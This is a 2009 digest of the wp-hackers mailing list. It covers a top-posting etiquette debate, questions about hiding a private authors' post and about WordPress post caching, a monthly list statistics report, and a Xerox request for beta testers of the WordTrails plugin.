From jeremy at visser.name  Thu Oct  1 03:02:05 2009
From: jeremy at visser.name (Jeremy Visser)
Date: Thu, 01 Oct 2009 13:02:05 +1000
Subject: [wp-hackers] [OT] Top posting
In-Reply-To: <1fa535a70909301636o4be26722q30783e4e37e5059@mail.gmail.com>
References: <902424490909291339m11b4a17bte321b2492a30cf45@mail.gmail.com>
	<1254257208.6639.3.camel@debian-desktop>
	<1fa535a70909291402o167573e7ydfa8bfef17da78cf@mail.gmail.com>
	<1254352338.3245.6.camel@rillian.narnia.sunriseroad.net>
	<1fa535a70909301636o4be26722q30783e4e37e5059@mail.gmail.com>
Message-ID: <1254366125.4613.0.camel@rillian.narnia.sunriseroad.net>

On Thu, 2009-10-01 at 00:36 +0100, John Blackbourn wrote:
> If I said "Learn to read top-posts or don't participate" I don't think
> you'd be too pleased. So let's remember the perspective here. It's not
> that big a deal.

Hehe I know. But what's more fun than flaming in a flamebait topic
marked "OT"? :)


From jeremy at visser.name  Thu Oct  1 03:09:37 2009
From: jeremy at visser.name (Jeremy Visser)
Date: Thu, 01 Oct 2009 13:09:37 +1000
Subject: [wp-hackers] List of constants
In-Reply-To: <e18d88d2.1ca413b.1ae3e74.41bb@BrewerRadio.com>
References: <e18d88d2.1ca413b.1ae3e74.41bb@BrewerRadio.com>
Message-ID: <1254366577.4613.4.camel@rillian.narnia.sunriseroad.net>

On Tue, 2009-09-29 at 15:34 -0400, Sharon Chambers wrote:
> I should've known...ever since I started working with Wordpress almost
> 3 years ago, I continue to be impressed how well written and easy to
> work with it is...You guys keep up the good work!  I'll keep hacking
> at it until I realize that wheel's already been invented...

What we need is more people participating in the documentation efforts,
i.e. the Codex. While the group of Codex maintainers are doing an
absolutely brilliant job, it is still somewhat detached from those
actually writing the code behind those functions.

The Codex writers are great at making things clear and easy to follow,
but many tips and tricks posted elsewhere will get lost in the ether.
(Or, in the wp-hackers archives, never to be seen again.)


From wp-hackers at striderweb.com  Thu Oct  1 05:17:16 2009
From: wp-hackers at striderweb.com (Stephen Rider)
Date: Thu, 1 Oct 2009 00:17:16 -0500
Subject: [wp-hackers] [OT] Top posting
In-Reply-To: <1254352338.3245.6.camel@rillian.narnia.sunriseroad.net>
References: <902424490909291339m11b4a17bte321b2492a30cf45@mail.gmail.com>
	<1254257208.6639.3.camel@debian-desktop>
	<1fa535a70909291402o167573e7ydfa8bfef17da78cf@mail.gmail.com>
	<1254352338.3245.6.camel@rillian.narnia.sunriseroad.net>
Message-ID: <762D5289-56C0-4A10-AFDE-CA3F78DA89F4@striderweb.com>


On Sep 30, 2009, at 6:12 PM, Jeremy Visser wrote:

> With bottom-posting comes trimming.

Huh?  I just read a thread on wp-testers with two-word replies bottom  
posted below 75 lines of quotes text.  Email after email.

People should definitely trim.  As for top/bottom, I like top because  
you can see what the reply is without having to scroll down each and  
every email.

<gump>And that's all I have to say about that.</gump>

Stephen

-- 
Stephen Rider
http://striderweb.com/





From william.canino at googlemail.com  Thu Oct  1 05:32:10 2009
From: william.canino at googlemail.com (William Canino)
Date: Thu, 1 Oct 2009 01:32:10 -0400
Subject: [wp-hackers] Creating an "Author Cafe"
In-Reply-To: <e4dc67e0909302220v59ebdbedyb650559a93ae3129@mail.gmail.com>
References: <e4dc67e0909302220v59ebdbedyb650559a93ae3129@mail.gmail.com>
Message-ID: <e4dc67e0909302232n711da91eu13f7dc7b5f635847@mail.gmail.com>

In my multi-author blog, I have a couple of editor accounts plus a
dozen author accounts and growing.

To protect the anonymity of everyone, the blog's policy is that only
editors above will ever get to see anybody's email address. ?To do
this, I redefined wp_notify_postauthor(), and I restricted access to
edit-comments.php with an init hook.

The pain right now is that the authors could not discuss privately or
coordinate amongst each other. ?Obviously I can't start a YahooGroups
or something for this.

I'm thinking of creating one post, comments enabled, say post_id =
100, that is visible only to authors and editors. ?This post mustn't
appear in feeds or to non-authors, and its comments mustn't appear in
the comments feed.

All the plugins I've seen that offer to do this seem to use a WP_Query
filter callback. It seems a big waste for the blog to scan each and
every query post array and take out this one post for 99% of the
world. ?Is there a better way? ?Do you have a better suggestion?

Best regards,
W

From william.canino at googlemail.com  Thu Oct  1 05:39:50 2009
From: william.canino at googlemail.com (William Canino)
Date: Thu, 1 Oct 2009 01:39:50 -0400
Subject: [wp-hackers] get_post() not fetching from post cache after
	update_post_caches()
Message-ID: <e4dc67e0909302239q4c093e88g4da9a77728b8b1af@mail.gmail.com>

WordPress wizards, would you have a look at this code:

$my_query = new WP_Query(array('post__in' => array(1,2,3)));
update_post_caches($my_query->posts);
echo $get_permalink(1);
echo $get_the_title(2);

Do you know why WordPress is still making SQL queries on lines 3 and
4? Shouldn't they be already in the object cache?

From r at schestowitz.com  Thu Oct  1 08:16:39 2009
From: r at schestowitz.com (Roy Schestowitz)
Date: Thu, 01 Oct 2009 09:16:39 +0100
Subject: [wp-hackers] WP-Hackers Stats for September 2009
Message-ID: <4AC46567.2020804@schestowitz.com>

  ?  Times are Greenwich Mean Time (GMT) +0:00

  ?  Statistics span a period of one month

  ?  Subject line formatted consistently "WP-Hackers Stats for <MONTH>
<YEAR>"

  ?  Killfile <subject contains "WP-Hackers Stats for "> if uninterested
____________________________________________________________

Stats for wp-hackers
~~~~~~~~~~~~~~~~~~~~
***** People who have written most messages:
+----+-----Author-----------------------------------+--Msg-+-Percent-+
|  1 | johnbillion+wp gmail.com                     |   25 |  7.44 % |
|  2 | otto ottodestruct.com                        |   24 |  7.14 % |
|  3 | scribu gmail.com                             |   21 |  6.25 % |
|  4 | wordpress dd32.id.au                         |   14 |  4.17 % |
|  5 | wp-hackers striderweb.com                    |   13 |  3.87 % |
|  6 | ozh planetozh.com                            |   12 |  3.57 % |
|  7 | kkarpieszuk gmail.com                        |    8 |  2.38 % |
|  8 | sharon BrewerRadio.com                       |    8 |  2.38 % |
|  9 | matt sivel.net                               |    8 |  2.38 % |
| 10 | ravi-lists g8o.net                           |    8 |  2.38 % |
| 11 | sudar sudarmuthu.com                         |    7 |  2.08 % |
| 12 | jason findingsimple.com                      |    7 |  2.08 % |
| 13 | leon.ash tawnylion.com                       |    6 |  1.79 % |
| 14 | junsuijin gmail.com                          |    6 |  1.79 % |
| 15 | gaarai gaarai.com                            |    6 |  1.79 % |
| 16 | steagl4ml gmail.com                          |    5 |  1.49 % |
| 17 | if.website gmail.com                         |    5 |  1.49 % |
| 18 | sojweb indiana.edu                           |    5 |  1.49 % |
| 19 | bernard vanhpc.org                           |    4 |  1.19 % |
| 20 | harish.mlists gmail.com                      |    4 |  1.19 % |
| 21 | dougal gunters.org                           |    4 |  1.19 % |
| 22 | derek amphibian.info                         |    4 |  1.19 % |
| 23 | jeremy visser.name                           |    4 |  1.19 % |
| 24 | peter.westwood ftwr.co.uk                    |    4 |  1.19 % |
| 25 | liste srpski.biz                             |    4 |  1.19 % |
+----+----------------------------------------------+------+---------+
|    | other                                        |  120 | 35.71 % |
+----+----------------------------------------------+------+---------+

***** Best authors, by total size of their messages (w/o quoting):
+----+-----Author-------------------------------------------+-KBytes-+
|  1 | otto ottodestruct.com                                |   21.2 |
|  2 | sharon BrewerRadio.com                               |   20.7 |
|  3 | johnbillion+wp gmail.com                             |   15.5 |
|  4 | wordpress dd32.id.au                                 |   13.8 |
|  5 | dougal gunters.org                                   |    9.2 |
|  6 | scribu gmail.com                                     |    9.1 |
|  7 | wp-hackers striderweb.com                            |    8.8 |
|  8 | ravi-lists g8o.net                                   |    8.3 |
|  9 | junsuijin gmail.com                                  |    7.1 |
| 10 | leon.ash tawnylion.com                               |    6.6 |
| 11 | liste srpski.biz                                     |    6.5 |
| 12 | ozh planetozh.com                                    |    5.8 |
| 13 | kkarpieszuk gmail.com                                |    5.6 |
| 14 | matt sivel.net                                       |    5.0 |
| 15 | pasi.koponen eetanet.fi                              |    4.9 |
| 16 | sudar sudarmuthu.com                                 |    4.6 |
| 17 | steagl4ml gmail.com                                  |    4.5 |
| 18 | anilo4ever gmail.com                                 |    3.9 |
| 19 | jason findingsimple.com                              |    3.8 |
| 20 | peter.westwood ftwr.co.uk                            |    3.3 |
| 21 | jer simianuprising.com                               |    3.1 |
| 22 | gaarai gaarai.com                                    |    2.8 |
| 23 | jeremy visser.name                                   |    2.7 |
| 24 | hal burgiss.net                                      |    2.5 |
| 25 | harish.mlists gmail.com                              |    2.4 |
+----+------------------------------------------------------+--------+

***** Best authors, by average size of their message (w/o quoting):
+----+-----Author--------------------------------------------+-bytes-+
|  1 | anilo4ever gmail.com                                  |  3965 |
|  2 | sharon BrewerRadio.com                                |  2653 |
|  3 | pasi.koponen eetanet.fi                               |  2508 |
|  4 | wordpress santosj.name                                |  2394 |
|  5 | dougal gunters.org                                    |  2356 |
|  6 | SuperMoonMan gmail.com                                |  1936 |
|  7 | ryan boren.nu                                         |  1886 |
|  8 | hpc.cnet gmail.com                                    |  1751 |
|  9 | liste srpski.biz                                      |  1674 |
| 10 | lists mediachrome.com                                 |  1580 |
| 11 | expert.it.dude gmail.com                              |  1419 |
| 12 | junsuijin gmail.com                                   |  1210 |
| 13 | info toscho.de                                        |  1205 |
| 14 | pt ptahd.com                                          |  1162 |
| 15 | mgerring emrl.com                                     |  1158 |
| 16 | leon.ash tawnylion.com                                |  1126 |
| 17 | jer simianuprising.com                                |  1068 |
| 18 | ravi-lists g8o.net                                    |  1061 |
| 19 | jayarjo gmail.com                                     |  1055 |
| 20 | brad webdevstudios.com                                |  1023 |
| 21 | wordpress dd32.id.au                                  |  1007 |
| 22 | skeltoac gmail.com                                    |   983 |
| 23 | jess funroe.net                                       |   970 |
| 24 | steagl4ml gmail.com                                   |   920 |
| 25 | otto ottodestruct.com                                 |   902 |
+----+-------------------------------------------------------+-------+

***** Table showing the most successful subjects:
+----+----Subject-----------------------------------+--Msg-+-Percent-+
|  1 | [wp-hackers] wp-config.php, wp-load.php, and |   26 |  7.74 % |
|  2 | [wp-hackers] [OT] Top posting                |   21 |  6.25 % |
|  3 | [wp-hackers] Making Updates Friendlier?      |   16 |  4.76 % |
|  4 | [wp-hackers] List of constants               |   15 |  4.46 % |
|  5 | [wp-hackers] hooks & future posts            |   13 |  3.87 % |
|  6 | [wp-hackers] WordPress Plugins Directory cod |   11 |  3.27 % |
|  7 | [wp-hackers] 404 Pages displaying as blank   |   11 |  3.27 % |
|  8 | [wp-hackers] Custom Fields -- Lost by Autosa |   10 |  2.98 % |
|  9 | [wp-hackers] Inline styles and TinyMCE       |    9 |  2.68 % |
| 10 | [wp-hackers] wp_list_pages() weirdness       |    9 |  2.68 % |
| 11 | [wp-hackers] Installation profiles for WordP |    9 |  2.68 % |
| 12 | [wp-hackers] Game hacking.                   |    8 |  2.38 % |
| 13 | [wp-hackers] cron overload - help!           |    7 |  2.08 % |
| 14 | [wp-hackers] add_action arrays?              |    7 |  2.08 % |
| 15 | [wp-hackers] How to enqueue default scrips i |    7 |  2.08 % |
| 16 | [wp-hackers] Security                        |    6 |  1.79 % |
| 17 | [wp-hackers] Extend / Plugins pwned          |    6 |  1.79 % |
| 18 | [wp-hackers] WXR format documentation        |    6 |  1.79 % |
| 19 | [wp-hackers] Theme updates and generated fil |    6 |  1.79 % |
| 20 | [wp-hackers] Child themes, and DB options    |    6 |  1.79 % |
| 21 | [wp-hackers] DOMDocument in plugin           |    6 |  1.79 % |
| 22 | [wp-hackers] dbDelta does not update the tab |    6 |  1.79 % |
| 23 | [wp-hackers] Rewrite endpoints               |    5 |  1.49 % |
| 24 | [wp-hackers] Quest for Self Pingbacks        |    5 |  1.49 % |
| 25 | [wp-hackers] Can't use the same conditional  |    5 |  1.49 % |
+----+----------------------------------------------+------+---------+
|    | other                                        |  100 | 29.76 % |
+----+----------------------------------------------+------+---------+

***** Most used email clients:
+----+----Mailer------------------------------------+--Msg-+-Percent-+
|  1 | Google Mail/Other                            |  194 | 57.74 % |
|  2 | Apple Mail (2.936)                           |   33 |  9.82 % |
|  3 | Opera Mail/10.10 (Win32)                     |   12 |  3.57 % |
|  4 | Outlook Connector for MDaemon 2.1.6          |    8 |  2.38 % |
|  5 | Apple Mail (2.1076)                          |    8 |  2.38 % |
|  6 | Thunderbird 2.0.0.23 (Windows/20090812)      |    8 |  2.38 % |
|  7 | Mozilla/5.x                                  |    7 |  2.08 % |
|  8 | G2/1.0                                       |    6 |  1.79 % |
|  9 | Lotus Notes Release 7.0                      |    5 |  1.49 % |
| 10 | Hamster-Pg/1.25                              |    5 |  1.49 % |
| 11 | Evolution 2.22.3.1                           |    4 |  1.19 % |
| 12 | Opera Mail/10.00 (Win32)                     |    3 |  0.89 % |
| 13 | Apple Mail (2.1075.2)                        |    3 |  0.89 % |
| 14 | Evolution 2.27.92                            |    3 |  0.89 % |
| 15 | Thunderbird 2.0.0.23 (X11/20090817)          |    3 |  0.89 % |
| 16 | Mutt                                         |    3 |  0.89 % |
| 17 | Apple Mail (2.935.3)                         |    3 |  0.89 % |
| 18 | Thunderbird 2.0.0.22 (Macintosh/20090605)    |    3 |  0.89 % |
| 19 | Thunderbird 2.0.0.23 (Macintosh/20090812)    |    2 |  0.60 % |
| 20 | Industrious bit-pushing elves                |    2 |  0.60 % |
| 21 | Thunderbird 2.0.0.12 (Windows/20080213)      |    2 |  0.60 % |
| 22 | Thunderbird 2.0.0.23 (X11/20090812)          |    2 |  0.60 % |
| 23 | Postbox 1.0.0 (Macintosh/2009090801)         |    2 |  0.60 % |
| 24 | Microsoft Office Outlook 12.0                |    2 |  0.60 % |
| 25 | Microsoft-Entourage/12.20.0.090605           |    2 |  0.60 % |
+----+----------------------------------------------+------+---------+
|    | other                                        |   11 |  3.27 % |
+----+----------------------------------------------+------+---------+

***** Table of maximal quoting:
+----+-----Author------------------------------------------+-Percent-+
|  1 | handy.solo gmail.com                                | 96.08 % |
|  2 | bryanharley gmail.com                               | 92.55 % |
|  3 | wordpress redfootwebdesign.com                      | 88.37 % |
|  4 | tim silentgap.com                                   | 88.03 % |
|  5 | emartin24 gmail.com                                 | 81.59 % |
|  6 | ricardo.cezar gmail.com                             | 77.40 % |
|  7 | brentswordpresslists gmail.com                      | 73.68 % |
|  8 | sojweb indiana.edu                                  | 73.40 % |
|  9 | jason findingsimple.com                             | 72.63 % |
| 10 | eddie eringle.net                                   | 71.87 % |
| 11 | johnbillion+wp gmail.com                            | 71.78 % |
| 12 | casey.bisson gmail.com                              | 70.98 % |
| 13 | niladam gmail.com                                   | 70.85 % |
| 14 | kontakt joernroeder.de                              | 70.63 % |
| 15 | dragonfly dragonflyeye.net                          | 69.45 % |
| 16 | SuperMoonMan gmail.com                              | 68.88 % |
| 17 | joseph josephscott.org                              | 68.82 % |
| 18 | fx76 hotmail.co.uk                                  | 66.75 % |
| 19 | Michael Clark                                       | 66.66 % |
| 20 | kparsell-wp kpdesign.net                            | 65.79 % |
| 21 | steve sltaylor.co.uk                                | 65.24 % |
| 22 | otto ottodestruct.com                               | 65.22 % |
| 23 | derek amphibian.info                                | 64.42 % |
| 24 | joost yoast.com                                     | 60.57 % |
| 25 | gaarai gaarai.com                                   | 59.92 % |
+----+-----------------------------------------------------+---------+
|    | average                                             | 54.37 % |
+----+-----------------------------------------------------+---------+

***** Graph showing number of messages written during hours of day:

100% -----------------------------------------#------- - 27
 90% -----------------------------------------#------- msgs
 80% -----------------------------------#-----#-------
 70% ---------------------#-----#---#-#-#-----#-#-#---
 60% -------------------#-#---#-#-#-#-#-#-----#-#-#---
 50% -------------------#-#-#-#-#-#-#-#-#-#---#-#-#-#-
 40% -----#-----------#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-
 30% -----#---------#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-
 20% -#---#---------#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-
 10% -#---#-#---#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-#-
      * * * * * * * * * * * * * * * * * * * * * * * *
hour  0         5           11          17          23


***** Graph showing number of messages written during days of month:

100% ---------------------------------------------------------#----- - 39
 90% ---------------------------------------------------------#----- msgs
 80% ---------------------------------------------------------#-----
 70% ---------------------------------------------------------#-----
 60% -------------------#-------------------------------------#-----
 50% -----------------#-#-------------#-----------------------#-----
 40% -----------------#-#---------#-#-#-------#---------------#-----
 30% -#-#---#---------#-#-------#-#-#-#-------#-----#---------#-----
 20% -#-#-#-#---#---#-#-#-------#-#-#-#---#-#-#-----#---------#-#---
 10% -#-#-#-#-#-#---#-#-#-#-#---#-#-#-#---#-#-#---#-#-#-#-----#-#-#-
      * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
 day  1         6           12          18          24            31


***** Graph showing number of messages written during days of week:

100% -----#----------------------- - 82
 90% -----#----------------------- msgs
 80% -----#---#---#---------------
 70% -----#---#---#---------------
 60% -----#---#---#---------------
 50% -----#---#---#---------------
 40% -#---#---#---#---------------
 30% -#---#---#---#---#---#-------
 20% -#---#---#---#---#---#---#---
 10% -#---#---#---#---#---#---#---
      *   *   *   *   *   *   *
     Mon Tue Wed Thu Fri Sat Sun


***** Maximal quoting:
      Author     : otto ottodestruct.com
      Subject    : [wp-hackers] Quest for Self Pingbacks
      Date       : Wed, 2 Sep 2009 07:54:05 -0500
      Quote ratio: 97.06% / 11015 bytes

***** Longest message:
      Author     : handy.solo gmail.com
      Subject    : [wp-hackers] Quest for Self Pingbacks
      Date       : Wed, 2 Sep 2009 07:29:31 -0600
      Size       : 12156 bytes

***** Most successful subject:
      Subject    : [wp-hackers] wp-config.php, wp-load.php, and ABSPATH
      No. of msgs: 26
      Total size : 43610 bytes

***** Final summary:
      Total number of messages:             336
      Total number of different authors:    93
      Total number of different subjects:   64
      Total size of messages (w/o headers): 574892 bytes
      Average size of a message:            1710 bytes

***** Generated by MailListStat v1.3, (C) 2001-2003 <marki (at) nexin.sk>
***** See http://freshmeat.net/projects/mls for details...

DISCLAIMER: Stats automatically produced. Remember that stats are often
meaningless and deceiving.

From azhaguselvan at gmx.com  Thu Oct  1 08:49:47 2009
From: azhaguselvan at gmx.com (Azhaguselvan)
Date: Thu, 01 Oct 2009 14:19:47 +0530
Subject: [wp-hackers] [OT] Top posting
In-Reply-To: <762D5289-56C0-4A10-AFDE-CA3F78DA89F4@striderweb.com>
References: <902424490909291339m11b4a17bte321b2492a30cf45@mail.gmail.com>
	<1254257208.6639.3.camel@debian-desktop>
	<1fa535a70909291402o167573e7ydfa8bfef17da78cf@mail.gmail.com>
	<1254352338.3245.6.camel@rillian.narnia.sunriseroad.net>
	<762D5289-56C0-4A10-AFDE-CA3F78DA89F4@striderweb.com>
Message-ID: <1254386987.3556.1.camel@debian-desktop>

On Thu, 2009-10-01 at 00:17 -0500, Stephen Rider wrote:
> On Sep 30, 2009, at 6:12 PM, Jeremy Visser wrote:
> 
> > With bottom-posting comes trimming.
> 
> Huh?  I just read a thread on wp-testers with two-word replies bottom  
> posted below 75 lines of quotes text.  Email after email.
> 
> People should definitely trim.  As for top/bottom, I like top because  
> you can see what the reply is without having to scroll down each and  
> every email.
> 
> <gump>And that's all I have to say about that.</gump>
> 
> Stephen
> 

Hmmm. If message is trimmed for the exact context what you are replying,
then top/bottom posting becomes immaterial ;-)


Azhaguselvan,SP


From if.website at gmail.com  Thu Oct  1 09:50:18 2009
From: if.website at gmail.com (Austin Matzko)
Date: Thu, 1 Oct 2009 04:50:18 -0500
Subject: [wp-hackers] Creating an "Author Cafe"
In-Reply-To: <e4dc67e0909302232n711da91eu13f7dc7b5f635847@mail.gmail.com>
References: <e4dc67e0909302220v59ebdbedyb650559a93ae3129@mail.gmail.com>
	<e4dc67e0909302232n711da91eu13f7dc7b5f635847@mail.gmail.com>
Message-ID: <674b4a3b0910010250y132c9111r6df9ea32593bddc2@mail.gmail.com>

On Thu, Oct 1, 2009 at 12:32 AM, William Canino
<william.canino at googlemail.com> wrote:
> I'm thinking of creating one post, comments enabled, say post_id =
> 100, that is visible only to authors and editors. ?This post mustn't
> appear in feeds or to non-authors, and its comments mustn't appear in
> the comments feed.
>
> All the plugins I've seen that offer to do this seem to use a WP_Query
> filter callback. It seems a big waste for the blog to scan each and
> every query post array and take out this one post for 99% of the
> world. ?Is there a better way? ?Do you have a better suggestion?

You could use the posts_where filter, and append a WHERE clause to
every non-relevant query:

" AND {$wpdb->posts}.ID != 100"

From sharon at BrewerRadio.com  Thu Oct  1 10:01:00 2009
From: sharon at BrewerRadio.com (Sharon Chambers)
Date: Thu, 01 Oct 2009 06:01:00 -0400
Subject: [wp-hackers] [OT] Top posting
Message-ID: <28099df9.1ca427e.9ee4152.440d@BrewerRadio.com>

Gentlemen, I hate to admit that I don't actually know it all (please don't tell my sister!), but...
What the devil does it mean to top-post?
-clueless

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of John Blackbourn
Sent: Wednesday, September 30, 2009 7:36 PM
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] [OT] Top posting

I love threads like this. People end up saying stupid things like this:

2009/10/1 Jeremy Visser <jeremy at visser.name>:

> Get with it, guys.

> Learn to bottom-post, or don't participate.

If I said "Learn to read top-posts or don't participate" I don't think
you'd be too pleased. So let's remember the perspective here. It's not
that big a deal.
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers


From wordpress at dd32.id.au  Thu Oct  1 10:03:01 2009
From: wordpress at dd32.id.au (Dion Hulse (dd32))
Date: Thu, 01 Oct 2009 20:03:01 +1000
Subject: [wp-hackers] Creating an "Author Cafe"
In-Reply-To: <674b4a3b0910010250y132c9111r6df9ea32593bddc2@mail.gmail.com>
References: <e4dc67e0909302220v59ebdbedyb650559a93ae3129@mail.gmail.com>
	<e4dc67e0909302232n711da91eu13f7dc7b5f635847@mail.gmail.com>
	<674b4a3b0910010250y132c9111r6df9ea32593bddc2@mail.gmail.com>
Message-ID: <op.u038vbqyspxmuu@dd32.no-ip.com>

How about, instead of excluding, you include specifically?

Create a new post, Set its post_status to 'private-author-cafe' or similar
filter the WHERE clause if the current user is an editor or admin, of  
"($old_where) OR post_status == 'private-author-cafe'

Seems like a possibility..

On Thu, 01 Oct 2009 19:50:18 +1000, Austin Matzko <if.website at gmail.com>  
wrote:

> On Thu, Oct 1, 2009 at 12:32 AM, William Canino
> <william.canino at googlemail.com> wrote:
>> I'm thinking of creating one post, comments enabled, say post_id =
>> 100, that is visible only to authors and editors.  This post mustn't
>> appear in feeds or to non-authors, and its comments mustn't appear in
>> the comments feed.
>>
>> All the plugins I've seen that offer to do this seem to use a WP_Query
>> filter callback. It seems a big waste for the blog to scan each and
>> every query post array and take out this one post for 99% of the
>> world.  Is there a better way?  Do you have a better suggestion?
>
> You could use the posts_where filter, and append a WHERE clause to
> every non-relevant query:
>
> " AND {$wpdb->posts}.ID != 100"
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>


-- 
--
Dion Hulse
e: contact at dd32.id.au
w: http://dd32.id.au/
m: 04 6621 9112 (+614 6621 9112)
WordPressQI: http://wordpressqi.com/

From sharon at BrewerRadio.com  Thu Oct  1 10:19:00 2009
From: sharon at BrewerRadio.com (Sharon Chambers)
Date: Thu, 01 Oct 2009 06:19:00 -0400
Subject: [wp-hackers] [OT] Top posting
Message-ID: <a98aa881.1ca4280.9fead5c.491c@BrewerRadio.com>

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Sharon Chambers
Sent: Thursday, October 01, 2009 6:01 AM
To: 'wp-hackers at lists.automattic.com'
Subject: Re: [wp-hackers] [OT] Top posting

Gentlemen, I hate to admit that I don't actually know it all (please don't tell my sister!), but...
What the devil does it mean to top-post?
-clueless


At first blush, I think I just realized the answer :$ never realized it was bad form...and my Outlook client (I know, but I gotta use it at work) defaults to this behavior.  So I guess every time I've top-posted I've irritated someone, eh?  Apologies 


From azhaguselvan at gmx.com  Thu Oct  1 10:24:37 2009
From: azhaguselvan at gmx.com (Azhaguselvan)
Date: Thu, 01 Oct 2009 15:54:37 +0530
Subject: [wp-hackers] [OT] Top posting
In-Reply-To: <28099df9.1ca427e.9ee4152.440d@BrewerRadio.com>
References: <28099df9.1ca427e.9ee4152.440d@BrewerRadio.com>
Message-ID: <1254392677.3556.5.camel@debian-desktop>

On Thu, 2009-10-01 at 06:01 -0400, Sharon Chambers wrote:
> Gentlemen, I hate to admit that I don't actually know it all (please don't tell my sister!), but...
> What the devil does it mean to top-post?
> -clueless

Link: http://en.wikipedia.org/wiki/Top-posting

Example of a top-post:

Because it messes up the order in which
people normally read text.
> Why is top-posting
> such a bad thing?


Top-posting.
> What is the most
> annoying thing in e-mail?

Always use bottom-posting.

> What is your name ?
My name is WordPress


Azhaguselvan,SP



From jeremy at visser.name  Thu Oct  1 13:37:33 2009
From: jeremy at visser.name (Jeremy Visser)
Date: Thu, 1 Oct 2009 13:37:33 +0000
Subject: [wp-hackers] [OT] Top posting
In-Reply-To: <a98aa881.1ca4280.9fead5c.491c@BrewerRadio.com>
References: <a98aa881.1ca4280.9fead5c.491c@BrewerRadio.com>
Message-ID: <43253ec50910010637h72232e59ge4077b3ec3d8b2f7@mail.gmail.com>

On Thu, Oct 1, 2009 at 10:19 AM, Sharon Chambers <sharon at brewerradio.com> wrote:
> At first blush, I think I just realized the answer :$ never realized it was bad form...and my Outlook client (I know, but I gotta use it at work) defaults to this behavior.  So I guess every time I've top-posted I've irritated someone, eh?  Apologies

I do believe that is the core reason why people top-post (which is the
root cause of both the apathetic reason for top-posting, as well as
simply being unaware that bottom-posting is proper etiquette or even
exists).

I cannot imagine anybody going to any great length to argue *for*
top-posting for pragmatic reasons. Nobody would argue that top-posting
looks tidier, etc. But similar to what Azhaguselvan said, a trimmed
top-post is far better than an untrimmed bottom-post.

Except when used for comedic effect. :)
http://www.cryptnet.net/mirrors/texts/kissedagirl.html

In screenshots I've seen of Google Wave, it looks like people can
comment and start IM-like conversations in the middle of paragraphs in
a document, and thus keep the conversation relevant to the part that
it is quoting. Very similar to proper bottom-posting. (Also reminds me
of the "Dasher" text-entry tool for people with low mobility.)

From jer at simianuprising.com  Thu Oct  1 15:11:27 2009
From: jer at simianuprising.com (Jeremy Clarke)
Date: Thu, 1 Oct 2009 11:11:27 -0400
Subject: [wp-hackers] Creating an "Author Cafe"
In-Reply-To: <op.u038vbqyspxmuu@dd32.no-ip.com>
References: <e4dc67e0909302220v59ebdbedyb650559a93ae3129@mail.gmail.com>
	<e4dc67e0909302232n711da91eu13f7dc7b5f635847@mail.gmail.com>
	<674b4a3b0910010250y132c9111r6df9ea32593bddc2@mail.gmail.com>
	<op.u038vbqyspxmuu@dd32.no-ip.com>
Message-ID: <e1202cb10910010811l2b92ca85s8f90179995fb731d@mail.gmail.com>

The other options may also be involved but you should also consider the
benefits of just making it a page instead of a post. Less likely to
interfere with most of the queries on your site and there's probably a lot
less pages overall. Semantically it also seems closer to a special page than
it is to a post (you'll also have access to the custom page templates, which
would probably be  useful for setting up your modified comments structure).

Another thing to consider is per-author contact forms on their user post
listing pages. We use that on our site and it seems to do a lot of the work
of giving authors access to each other without making their emails public.
It obviously also gives site visitors a private way of contacting authors.
Not sure if there's a plugin out there, we use one I mostly coded myself,
but its pretty basic if you know what you're doing ( check out
http://wordpress.org/extend/plugins/really-simple-captcha/ for a captcha
framework you could incorporate).

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From azhaguselvan at gmx.com  Thu Oct  1 15:37:29 2009
From: azhaguselvan at gmx.com (Azhaguselvan)
Date: Thu, 01 Oct 2009 21:07:29 +0530
Subject: [wp-hackers] [OT] Top posting
In-Reply-To: <a98aa881.1ca4280.9fead5c.491c@BrewerRadio.com>
References: <a98aa881.1ca4280.9fead5c.491c@BrewerRadio.com>
Message-ID: <1254411449.3235.2.camel@debian-desktop>

On Thu, 2009-10-01 at 06:19 -0400, Sharon Chambers wrote:
> 
> At first blush, I think I just realized the answer :$ never realized it was bad form.

> ..and my Outlook client (I know, but I gotta use it at work) defaults to this behavior.  So I guess every time I've top-posted I've irritated someone, eh?  Apologies 

Switch to GNU/Linux :) Ditch that buggy/shitty/dumb outlook :-/ At least
switch to Thunderbird in doze.


Azhaguselvan,SP

PS: My personal opinion ;-)


From Jesse.Silverstein at xerox.com  Thu Oct  1 15:44:29 2009
From: Jesse.Silverstein at xerox.com (Silverstein, Jesse)
Date: Thu, 1 Oct 2009 08:44:29 -0700
Subject: [wp-hackers] [OT] Testing needed for WordTrails plugin from Xerox
Message-ID: <42DF740CBF5256498541B6CA6DB6E56D04F30627@USA7061MS03.na.xerox.net>

Hi WordPress community members:

 

I am part of a team at the Xerox Innovation Group, and we've just
released a powerful plugin called "WordTrails" in beta.  I am emailing
this group to solicit volunteers to help us test it a bit before we
officially change the version number from 0.9.x to 1.0.

 

WordTrails allows you to very easily blaze arbitrary paths (with
branches and loops) through a WP blog. Readers can follow these trails
through a "bird's eye view" Flash trailmap and a "worm's eye view"
sidebar widget. They can also linearize and convert a trail to a PDF
with one click. 

 

So WordTrails basically overlays a highly flexible navigation scheme on
a WP blog, and simultaneously turns it into a sort of one-click ebook
publishing system.

 

I'd like to invite you to check out and install the plugin
(http://wordpress.org/extend/plugins/wordtrails). You can see it in
action at http://blog.trailmeme.com (click on the 'Trails' page). You
can also try it out for yourself before installing, on our sandbox blog
(open registration): http://blog.trailmeme.com/sandbox 

 

WordTrails is part of the ecosystem of a larger technology set called
Xerox Trails, which includes a destination site at www.trailmeme.com
<http://www.trailmeme.com/>  that is currently in invite-only beta. For
more background go to: http://blog.trailmeme.com/new-to-trails/

 

